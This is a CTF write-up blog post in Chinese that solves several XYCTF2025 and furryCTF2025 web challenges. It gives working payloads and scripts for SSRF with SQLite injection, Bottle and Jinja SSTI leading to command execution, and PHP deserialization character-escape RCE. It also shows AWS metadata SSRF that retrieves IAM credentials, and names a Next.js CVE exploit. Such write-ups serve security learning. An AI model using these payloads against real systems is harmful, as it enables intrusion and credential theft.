---
title: XYCTF2025&furryCTF2025
date: 2026-03-13 18:01:47
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/20260316-203737-7f3da3.jpeg
categories: CTF
---

## Fate

```python
import flask
import sqlite3
import requests
import string
import json
app = flask.Flask(__name__)
blacklist = string.ascii_letters
def binary_to_string(binary_string):
    if len(binary_string) % 8 != 0:
        raise ValueError("Binary string length must be a multiple of 8")
    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)
    
    return string_output

@app.route('/proxy', methods=['GET'])
def nolettersproxy():
    url = flask.request.args.get('url')
    if not url:
        return flask.abort(400, 'No URL provided')
    
    target_url = "http://lamentxu.top" + url
    for i in blacklist:
        if i in url:
            return flask.abort(403, 'I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~')
    if "." in url:
        return flask.abort(403, 'No ssrf allowed')
    response = requests.get(target_url)

    return flask.Response(response.content, response.status_code)
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    print(flask.request.remote_addr)
    return flask.render_template("index.html")

@app.route('/1337', methods=['GET'])
def api_search():
    if flask.request.remote_addr == '127.0.0.1': #必须本地访问
        code = flask.request.args.get('0')
        if code == 'abcdefghi':
            req = flask.request.args.get('1')
            try:
                req = binary_to_string(req)
                print(req)
                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)
            except:
                flask.abort(400, "Invalid JSON")
            if 'name' not in req:
                flask.abort(400, "Empty Person's name")

            name = req['name']
            if len(name) > 6:
                flask.abort(400, "Too long")
            if '\'' in name:
                flask.abort(400, "NO '")
            if ')' in name:
                flask.abort(400, "NO )")
            """
            Some waf hidden here ;)
            """

            fate = db_search(name)
            if fate is None:
                flask.abort(404, "No such Person")

            return {'Fate': fate}
        else:
            flask.abort(400, "Hello local, and hello hacker")
    else:
        flask.abort(403, "Only local access allowed")

if __name__ == '__main__':
    app.run(debug=True)
```

这里我们的最终目的是通过/1337路由的sqlite查询查询到LAMENTXU字段

那么/1337限制必须内网访问，就用到了/proxy路由的ssrf，对url过滤了字母和点字符，这里我们用十进制绕过。

```
/proxy?url=@2130706433:8080/1337
```

下一步是/1337路由要求传参0和1，其中0可以用二次编码绕过

它对1进行binary_to_string，然后解析json，我们用ai写一个string_to_binary

```python
payload = '{"name": {"))))))) or 1=1 order by FATE DESC --+":"1"}}'
binary_output = ''.join(format(ord(char), '08b') for char in payload)
print(binary_output)
```

下面思考对name的长度限制怎么绕过，这里看了wp了解到了字典绕过，也就是name是一个字典那么它的长度就是1

接下来就是sqlite注入了，闭合就好

![image-20260313181437857](https://gitee.com/bobrocket/img/raw/master/img/image-20260313181437857.png)

## 出题人已疯

bottle的SSTI可以直接访问到内部类，所以我们之间往os.a里面一个一个塞字符就行了

```python
import requests
 
url='http://challenge.imxbt.cn:30765/attack'
 
payload="__import__('os').system('cat /flag>1')"
 
 
flag=True
for i in payload:
    if flag:
        tmp=f'\n%import os;os.b="{i}"'
        flag=False
    else:
        tmp=f'\n%import os;os.b+="{i}"'
    r=requests.get(url,params={"payload":tmp})
r=requests.get(url,params={"payload":"\n%import os;eval(os.b)"})
r=requests.get(url,params={"payload":"\n%include('1')"}).text
print(r)
```

这里最后两步如果用浏览器手动传参会有一点点问题，还是一个脚本一次性完成较好

## 出题人又疯

在上题的基础上过滤了一些关键字，我们可以用斜体、全角绕过

```
/attack?payload={{%BApen(%27/flag%27).re%aad()}}
```

## Now you see me1

源码中间藏了一段代码

```python
# YOU FOUND ME ;)
# -*- encoding: utf-8 -*-
'''
@File    :   src.py
@Time    :   2025/03/29 01:10:37
@Author  :   LamentXU 
'''
import flask
import sys
enable_hook =  False
counter = 0
def audit_checker(event,args):
    global counter
    if enable_hook:
        if event in ["exec", "compile"]:
            counter += 1
            if counter > 4:
                raise RuntimeError(event)

lock_within = [
    "debug", "form", "args", "values", 
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application", 
    'data', 'url' ,'\'', '"', 
    "getattr", "_", "{{", "}}", 
    "[", "]", "\\", "/","self", 
    "lipsum", "cycler", "joiner", "namespace", 
    "init", "dir", "join", "decode", 
    "batch", "first", "last" , 
    " ","dict","list","g.",
    "os", "subprocess",
    "g|a", "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\\u", "pop", "referer",
    "The closer you see, the lesser you find."] 
        # I hate all these.
app = flask.Flask(__name__)
@app.route('/')
def index():
    return 'try /H3dden_route'
@app.route('/H3dden_route')
def r3al_ins1de_th0ught():
    global enable_hook, counter
    name = flask.request.args.get('My_ins1de_w0r1d')
    if name:
        try:
            if name.startswith("Follow-your-heart-"):
                for i in lock_within:
                    if i in name:
                        return 'NOPE.'
                enable_hook = True
                a = flask.render_template_string('{#'+f'{name}'+'#}')
                enable_hook = False
                counter = 0
                return a
            else:
                return 'My inside world is always hidden.'
        except RuntimeError as e:
            counter = 0
            return 'NO.'
        except Exception as e:
            return 'Error'
    else:
        return 'Welcome to Hidden_route!'

if __name__ == '__main__':
    import os
    try:
        import _posixsubprocess
        del _posixsubprocess.fork_exec
    except:
        pass
    import subprocess
    del os.popen
    del os.system
    del subprocess.Popen
    del subprocess.call
    del subprocess.run
    del subprocess.check_output
    del subprocess.getoutput
    del subprocess.check_call
    del subprocess.getstatusoutput
    del subprocess.PIPE
    del subprocess.STDOUT
    del subprocess.CalledProcessError
    del subprocess.TimeoutExpired
    del subprocess.SubprocessError
    sys.addaudithook(audit_checker)
    app.run(debug=False, host='0.0.0.0', port=5000)
```

SSTI，过滤很严格，用fenjing梭不出来

首先观察漏洞点

```python
a = flask.render_template_string('{#'+f'{name}'+'#}')
```

`{##}`是jinja里的注释标识，这里我们构造闭合即可，这里注意#要进行url编码

```
My_ins1de_w0r1d=Follow-your-heart-suny%23}{%print(7*7)%}{%23
```

下面我们看过滤的部分,request没有被过滤，所以我们考虑利用request的属性

request.mimetype可以获取HTTP头中content-type中的内容，那么我们就可以构造request.arg传参

![image-20260314103141807](https://gitee.com/bobrocket/img/raw/master/img/image-20260314103141807.png)

接下来我们找一下链子，用getitem绕过中括号

```
().__class__.__bases__.__getitem__(0).__subclasses__()
```

attr

```
()|attr("__class__")|attr("__bases__")|attr("__getitem__")(0)|attr("__subclasses__")()
```

传参绕过下划线和关键字

```
((()|attr((request|attr(request.mimetype)).get(0|string))|attr((request|attr(request.mimetype)).get(1|string))|attr((request|attr(request.mimetype)).get(2|string)))(0)|attr((request|attr(request.mimetype)).get(3|string)))()
```

![image-20260314105218017](https://gitee.com/bobrocket/img/raw/master/img/image-20260314105218017.png)

找到可利用的模块

![image-20260314105255530](https://gitee.com/bobrocket/img/raw/master/img/image-20260314105255530.png)

```
().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(137).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')("__import__('os').popen('base64 /flag*').read()")
```

修改一下

```
My_ins1de_w0r1d=Follow-your-heart-%23}{%print(((((((()|attr((request|attr(request.mimetype)).get(0|string))|attr((request|attr(request.mimetype)).get(1|string))|attr((request|attr(request.mimetype)).get(2|string)))(0)|attr((request|attr(request.mimetype)).get(3|string)))()|attr((request|attr(request.mimetype)).get(2|string)))(137)|attr((request|attr(request.mimetype)).get(4|string))|attr((request|attr(request.mimetype)).get(5|string))|attr((request|attr(request.mimetype)).get(2|string)))((request|attr(request.mimetype)).get(6|string))|attr((request|attr(request.mimetype)).get(2|string)))((request|attr(request.mimetype)).get(7|string)))((request|attr(request.mimetype)).get(8|string)))%}{%23&0=__class__&1=__bases__&2=__getitem__&3=__subclasses__&4=__init__&5=__globals__&6=__builtins__&7=eval&8=__import__('os').popen('base64 /flag*').read()
```

![image-20260314111156451](https://gitee.com/bobrocket/img/raw/master/img/image-20260314111156451.png)

#### 参考文献

[SSTI进阶 | 沉铝汤的破站](https://chenlvtang.top/2021/03/31/SSTI进阶/)

## babypop

之前新春杯做了一个字符增多的逃逸，这次是减少的，更抽象一些

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class SecurityProvider {
    private $token;
    public function __construct() {
        $this->token = md5(uniqid());
    }
    public function verify($data) {
        if (strpos($data, '..') !== false) {
            die("Attack Detected");
        }
        return $data;
    }
}
class LogService {
    protected $handler;
    protected $formatter;
    
    public function __construct($handler = null) {
        $this->handler = $handler;
        $this->formatter = new DateFormatter();
    }

    public function __destruct() {
        if ($this->handler && method_exists($this->handler, 'close')) {
            $this->handler->close();
        }
    }
}
class FileStream {
    private $path;
    private $mode;
    public $content; 
    public function __construct($path, $mode) {
        $this->path = $path;
        $this->mode = $mode;
    }
    public function close() {
        if ($this->mode === 'debug' && !empty($this->content)) {
            $cmd = $this->content;
            if (strlen($cmd) < 2) return;
            @eval($cmd);
        } else {
            return true;
        }
    }
}
class DateFormatter {
    public function format($timestamp) {
        return date('Y-m-d H:i:s', $timestamp);
    }
}
class UserProfile {
    public $username;
    public $bio;
    public $preference; 

    public function __construct($u, $b) {
        $this->username = $u;
        $this->bio = $b;
        $this->preference = new DateFormatter();
    }
}
class DataSanitizer {
    public static function clean($input) {
        return str_replace("hacker", "", $input);
    }
}
$raw_user = $_POST['user'] ?? null;
$raw_bio = $_POST['bio'] ?? null;
if ($raw_user && $raw_bio) {
    $sec = new SecurityProvider();
    $sec->verify($raw_user);
    $sec->verify($raw_bio);
    $profile = new UserProfile($raw_user, $raw_bio);
    $data = serialize($profile);
    if (strlen($data) > 4096) {
        die("Data too long");
    }
    $safe_data = DataSanitizer::clean($data); //字符减少
    $unserialized = unserialize($safe_data);
    if ($unserialized instanceof UserProfile) {
        echo "Profile loaded for " . htmlspecialchars($unserialized->username);
    }
}
```

链子很简单，关键是如何调用

```
$a = new FileStream("123","debug");
$a -> content = "system('cat /flag');";
$b = new LogService($a);
```

我们最终的$safe_data长这样

```
O:11:"UserProfile":3:{s:8:"username";s:x:"xxx";s:3:"bio";s:x:"xxx";s:10:"preference";O:13:"DateFormatter":0:{}}
```

我们可控两部分，最终目的就是让`UserProfile->preference = $b`从而调用链子

也就是需要把`";s:3:"bio";s:xxx:"`吃掉从而加入恶意代码，这里只有21个字符所以我们补5个A

```php
<?php
class LogService {
    protected $handler;
    protected $formatter;

    public function __construct($handler = null) {
        $this->handler = $handler;
        $this->formatter = new DateFormatter();
    }
}
class FileStream {
    private $path;
    private $mode;
    public $content;
    public function __construct($path, $mode) {
        $this->path = $path;
        $this->mode = $mode;
    }
}
class DateFormatter {
    public function format($timestamp) {
        return date('Y-m-d H:i:s', $timestamp);
    }
}

$a = new FileStream("123","debug");
$a -> content = "system('cat /flag');";
$b = new LogService($a);

echo serialize($b);

$payload = '";s:10:"preference";'.serialize($b);

echo "\n";
echo urlencode($payload);
```

最终

```
bio=AAAAA%22%3Bs%3A10%3A%22preference%22%3BO%3A10%3A%22LogService%22%3A2%3A%7Bs%3A10%3A%22%00*%00handler%22%3BO%3A10%3A%22FileStream%22%3A3%3A%7Bs%3A16%3A%22%00FileStream%00path%22%3Bs%3A3%3A%22123%22%3Bs%3A16%3A%22%00FileStream%00mode%22%3Bs%3A5%3A%22debug%22%3Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D&user=hackerhackerhackerhacker
```

## CCPrevie

第一次做云安全题，这里直接贴一下wp

打开题目靶机，我们看到一个名为 CloudConnect的网页工具，其功能是测试网站连通性

这题的描述里说到服务部署在亚马逊云服务器上，并且是EC2实例，题目还说这是一个curl的代理

![img](https://gitee.com/bobrocket/img/raw/master/asynccode)

这是一道很典型的云安全题，云服务提供了元数据服务，允许实例访问自身的配置信息和凭证，攻击者可以利用SSRF漏洞访问这些元数据服务

AWS EC2 实例有一个众所周知的链路本地地址：169.254.169.254，实例内部的服务可以通过HTTP请求这个IP来获取自身的配置信息、网络信息以及最敏感的 IAM 凭证

所以我们直接用POC打，在输入框种输入payload：

```Markdown
http://169.254.169.254/latest/meta-data/
```

响应结果：

![image-20260315131817264](https://gitee.com/bobrocket/img/raw/master/image-20260315131817264.png)

成功了！服务器返回了目录列表

接下来就可以挖IAM凭证了，首先我们先看IAM目录：

```Markdown
http://169.254.169.254/latest/meta-data/iam/
```

响应：

![image-20260315115313089](https://gitee.com/bobrocket/img/raw/master/image-20260315115313089.png)

然后查看凭证目录：

```Markdown
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

这里我们发现了一个名为 admin-role 的角色：

![img](https://gitee.com/bobrocket/img/raw/master/img/asynccode)

然后我们接着看它的凭证

```Markdown
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

直接拿到flag了：

![image-20260315115323409](https://gitee.com/bobrocket/img/raw/master/image-20260315115323409.png)

## 下一代有下一代的问题

这里用wappalyzer工具看一眼，Nextjs版本16.0.6，好家伙又是CVE-2025-55182

![image-20260315115458529](https://gitee.com/bobrocket/img/raw/master/image-20260315115458529.png) 

直接打

![image-20260315115506846](https://gitee.com/bobrocket/img/raw/master/image-20260315115506846.png)

  

